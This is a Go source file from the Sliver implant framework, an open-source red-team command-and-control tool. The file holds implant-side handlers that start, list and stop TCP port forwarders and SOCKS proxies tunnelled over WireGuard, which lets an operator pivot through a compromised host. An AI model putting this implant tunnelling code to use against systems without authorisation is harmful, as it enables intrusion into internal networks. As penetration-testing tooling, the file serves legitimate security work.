package handlers

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// {{if .Config.IncludeWG}}

import (
	"fmt"
	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/bishopfox/sliver/implant/sliver/forwarder"
	"github.com/bishopfox/sliver/implant/sliver/transports/wireguard"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
	"google.golang.org/protobuf/proto"
)

func wgListTCPForwardersHandler(_ []byte, resp RPCResponse) {
	fwders := forwarder.GetTCPForwarders()
	listResp := &pb.WGTCPForwarders{}
	fwdList := make([]*pb.WGTCPForwarder, 0)
	for _, f := range fwders {
		fwdList = append(fwdList, &pb.WGTCPForwarder{
			ID:         int32(f.ID),
			LocalAddr:  f.LocalAddr(),
			RemoteAddr: f.RemoteAddr(),
		})
	}
	listResp.Forwarders = fwdList
	data, err := proto.Marshal(listResp)
	resp(data, err)
}

func wgStartPortfwdHandler(data []byte, resp RPCResponse) {
	fwdReq := &pb.WGPortForwardStartReq{}
	err := proto.Unmarshal(data, fwdReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v\n", err)
		// {{end}}
		return
	}

	fwder := forwarder.NewWGTCPForwarder(fwdReq.RemoteAddress, wireguard.GetTUNAddress(), int(fwdReq.LocalPort), wireguard.GetTNet())
	go fwder.Start()
	fwdResp := &pb.WGPortForward{
		Response: &commonpb.Response{},
		Forwarder: &pb.WGTCPForwarder{
			ID:         int32(fwder.ID),
			LocalAddr:  fwder.LocalAddr(),
			RemoteAddr: fwder.RemoteAddr(),
		},
	}
	data, err = proto.Marshal(fwdResp)
	resp(data, err)
}

func wgStopPortfwdHandler(data []byte, resp RPCResponse) {
	stopReq := &pb.WGPortForwardStopReq{}
	err := proto.Unmarshal(data, stopReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v\n", err)
		// {{end}}
		return
	}
	stopResp := &pb.WGPortForward{
		Response: &commonpb.Response{},
	}
	fwd := forwarder.GetTCPForwarder(int(stopReq.ID))
	if fwd == nil {
		stopResp.Response.Err = fmt.Sprintf("no forwarder found for id %d", stopReq.ID)
	} else {
		stopResp.Forwarder = &pb.WGTCPForwarder{
			ID:         int32(fwd.ID),
			LocalAddr:  fwd.LocalAddr(),
			RemoteAddr: fwd.RemoteAddr(),
		}
		fwd.Stop()
		forwarder.RemoveTCPForwarder(fwd.ID)
	}
	data, err = proto.Marshal(stopResp)
	resp(data, err)
}

func wgListSocksServersHandler(_ []byte, resp RPCResponse) {
	socksServers := forwarder.GetSocksServers()
	listResp := &pb.WGSocksServers{}
	serverList := make([]*pb.WGSocksServer, 0)
	for _, s := range socksServers {
		serverList = append(serverList, &pb.WGSocksServer{
			ID:        int32(s.ID),
			LocalAddr: s.LocalAddr(),
		})
	}
	listResp.Servers = serverList
	data, err := proto.Marshal(listResp)
	resp(data, err)
}

func wgStartSocksHandler(data []byte, resp RPCResponse) {
	startReq := &pb.WGSocksStartReq{}
	err := proto.Unmarshal(data, startReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v\n", err)
		// {{end}}
		return
	}
	server := forwarder.NewWGSocksServer(int(startReq.Port), wireguard.GetTUNAddress(), wireguard.GetTNet())
	go server.Start()
	startResp := &pb.WGSocks{
		Response: &commonpb.Response{},
		Server: &pb.WGSocksServer{
			ID:        int32(server.ID),
			LocalAddr: server.LocalAddr(),
		},
	}
	data, err = proto.Marshal(startResp)
	resp(data, err)
}
func wgStopSocksHandler(data []byte, resp RPCResponse) {
	stopReq := &pb.WGSocksStopReq{}
	err := proto.Unmarshal(data, stopReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v\n", err)
		// {{end}}
		return
	}
	server := forwarder.GetSocksServer(int(stopReq.ID))
	stopResp := &pb.WGSocks{
		Response: &commonpb.Response{},
	}
	if server == nil {
		stopResp.Response.Err = fmt.Sprintf("no server found for id %d", stopReq.ID)
	} else {
		stopResp.Server = &pb.WGSocksServer{
			ID:        int32(server.ID),
			LocalAddr: server.LocalAddr(),
		}
		server.Stop()
		forwarder.RemoveSocksServer(server.ID)
	}
	data, err = proto.Marshal(stopResp)
	resp(data, err)
}

// {{end}}
